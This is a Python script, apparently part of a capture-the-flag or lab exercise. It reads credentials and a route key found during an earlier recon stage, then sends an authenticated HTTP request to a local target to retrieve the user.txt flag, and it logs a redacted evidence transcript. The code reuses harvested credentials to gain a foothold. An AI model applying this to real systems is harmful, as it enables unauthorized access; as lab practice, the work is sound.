"""Manual foothold: uses the credentials and route key DISCOVERED by the recon
engine to authenticate to /user.txt and retrieve the flag.

This is a separate, deliberate step from the recon engine (which is discovery
only). It reads its inputs from the engine's saved raw output, sends one
authenticated request, and writes a full transcript to foothold-evidence.txt so
the flag reconciles with the request that produced it.
"""

import base64
import json
import socket
from datetime import datetime, timezone


def utc_now():
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def main():
    host, port = "127.0.0.1", 18098
    sig = json.load(open("run/raw/signal/signal.json"))
    http = json.load(open("run/raw/http/http.json"))
    vhost = sig["vhost"]
    route_key = sig["route_key"]
    username = http["credentials"]["username"]
    password = http["credentials"]["password"]

    # build HTTP Basic auth + route-proof headers from discovered values
    token = base64.b64encode(f"{username}:{password}".encode()).decode("ascii")
    request_lines = [
        "GET /user.txt HTTP/1.1",
        f"Host: {vhost}",
        f"Authorization: Basic {token}",
        f"X-Route-Key: {route_key}",
        "Connection: close",
        "",
        "",
    ]
    request = "\r\n".join(request_lines)

    sent_at = utc_now()
    sock = socket.create_connection((host, port), timeout=4)
    try:
        sock.sendall(request.encode("utf-8"))
        raw = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            raw += chunk
    finally:
        sock.close()

    response = raw.decode("utf-8", errors="replace")
    status_line = response.split("\r\n", 1)[0]
    body = response.partition("\r\n\r\n")[2]

    # redact the password in the transcript; keep everything else verifiable
    redacted_request = request.replace(f"Basic {token}", "Basic <redacted-basic-auth>")

    transcript = f"""FOOTHOLD EVIDENCE
=================
recorded_at        : {sent_at}
target             : {host}:{port}
vhost              : {vhost}
authenticated_user : {username}
route_key_source   : signal service ROUTE command (see run/raw/signal/signal.json)
credential_source  : /ops-diagnostics (see run/raw/http/http.json)

--- REQUEST SENT (authorization redacted) ---
{redacted_request}
--- RESPONSE STATUS ---
{status_line}

--- RESPONSE BODY (user.txt) ---
{body}
--- END ---
"""
    with open("foothold-evidence.txt", "w", encoding="utf-8") as h:
        h.write(transcript)

    print(status_line)
    print("flag:", body.strip())
    print("transcript written to foothold-evidence.txt")


if __name__ == "__main__":
    main()
